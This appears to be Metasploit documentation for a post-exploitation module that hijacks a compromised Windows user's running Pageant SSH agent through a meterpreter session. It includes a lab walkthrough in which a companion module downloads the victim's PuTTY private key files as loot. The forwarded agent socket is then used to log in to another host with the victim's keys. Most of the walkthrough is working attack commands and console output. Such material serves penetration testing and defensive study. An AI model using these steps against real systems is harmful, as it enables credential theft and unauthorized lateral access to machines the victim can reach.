## Vulnerable Application

This module forwards SSH agent requests from a local socket to a remote Pageant instance.
If a target Windows machine is compromised and is running Pageant, this will allow the
attacker to run normal OpenSSH commands (e.g. ssh-add -l) against the Pageant host which are
tunneled through the meterpreter session. This could therefore be used to authenticate
with a remote host using a private key which is loaded into a remote user's Pageant instance,
without ever having knowledge of the private key itself.

Note that this requires the PageantJacker meterpreter extension, but this will be automatically
loaded into the remote meterpreter session by this module if it is not already loaded.

## Verification Steps

1. Start msfconsole
2. Get a Meterpreter session
3. Do: `use post/windows/manage/forward_pageant`
4. Do: `set SESSION <session id>`
5. Do: `run`

## Options

### SocketPath

Specify a filename for the local UNIX socket. (default path is random)

## Scenarios

### Pageant 0.77.0.0 on Windows 7 SP1 (x64)

Use `windows/gather/enum_putty_saved_sessions` to detect Pageant and known hosts:

```
msf6 > use post/windows/gather/enum_putty_saved_sessions
msf6 post(windows/gather/enum_putty_saved_sessions) > set session 1
session => 1
msf6 post(windows/gather/enum_putty_saved_sessions) > run

[*] Looking for saved PuTTY sessions
[*] Found 3 sessions

PuTTY Saved Sessions
====================

 Name             HostName         UserName  PublicKeyFile                       PortNumber  PortForwardings  ProxyUsername  ProxyPassword
 ----             --------         --------  -------------                       ----------  ---------------  -------------  -------------
 192.168.200.158  192.168.200.158            C:\Users\user\Desktop\ubuntu22.ppk  22
 example.com      example.com                C:\Users\user\Desktop\serial1.ppk   22
 serial1                                     C:\Users\user\Desktop\serial1.ppk   0

[+] PuTTY saved sessions list saved to /root/.msf4/loot/20220807223341_default_192.168.200.190_putty.sessions.c_273976.txt in CSV format & available in notes (use 'notes -t putty.savedsession' to view).
[*] Downloading private keys...
[+] PuTTY private key file for '192.168.200.158' (C:\Users\user\Desktop\ubuntu22.ppk) saved to: /root/.msf4/loot/20220807223341_default_192.168.200.190_putty.ppk.file_988729.bin
[+] PuTTY private key file for 'example.com' (C:\Users\user\Desktop\serial1.ppk) saved to: /root/.msf4/loot/20220807223342_default_192.168.200.190_putty.ppk.file_341943.bin
[+] PuTTY private key file for 'serial1' (C:\Users\user\Desktop\serial1.ppk) saved to: /root/.msf4/loot/20220807223342_default_192.168.200.190_putty.ppk.file_265111.bin


PuTTY Private Keys
==================

 Name             HostName         UserName  PublicKeyFile                       Type  Cipher  Comment
 ----             --------         --------  -------------                       ----  ------  -------
 192.168.200.158  192.168.200.158            C:\Users\user\Desktop\ubuntu22.ppk
 example.com      example.com                C:\Users\user\Desktop\serial1.ppk
 serial1                                     C:\Users\user\Desktop\serial1.ppk


[*] Looking for previously stored SSH host key fingerprints
[*] Found 1 stored key fingerprint
[*] Downloading stored key fingerprints...

Stored SSH host key fingerprints
================================

 SSH Endpoint        Key Type(s)
 ------------        -----------
 192.168.200.158:22  ssh-ed25519

[+] PuTTY stored host keys list saved to /root/.msf4/loot/20220807223342_default_192.168.200.190_putty.storedfing_027625.txt in CSV format & available in notes (use 'notes -t putty.storedfingerprint' to view).

[*] Looking for Pageant...
[+] Pageant is running (Handle 0x330820)
[*] Post module execution completed

```

Establish a local forward with `post/windows/manage/forward_pageant`:

```
msf6 > use post/windows/manage/forward_pageant 
msf6 post(windows/manage/forward_pageant) > set session 1
session => 1
msf6 post(windows/manage/forward_pageant) > run

[*] Launched listening socket on /tmp/bVN4Dg2W
[*] Set SSH_AUTH_SOCK variable to /tmp/bVN4Dg2W (e.g. export SSH_AUTH_SOCK="/tmp/bVN4Dg2W")
[*] Now use any SSH tool normally (e.g. ssh-add)
```

Specify the `SSH_AUTH_SOCK` UNIX socket path when using ssh tools:

```
$ SSH_AUTH_SOCK="/tmp/bVN4Dg2W" ssh-add -l
3072 SHA256:/M07p51CmCSMrV1lbFs19OMvyRw6g9Wxbq8bW5px0KA asdf@ubuntu-22-04-amd64 (RSA)

$ SSH_AUTH_SOCK="/tmp/bVN4Dg2W" ssh asdf@192.168.200.158
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

209 updates can be applied immediately.
29 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

*** System restart required ***
Last login: Sun Aug  7 22:19:04 2022 from 192.168.200.130
asdf@ubuntu-22-04-amd64:~$ 
```
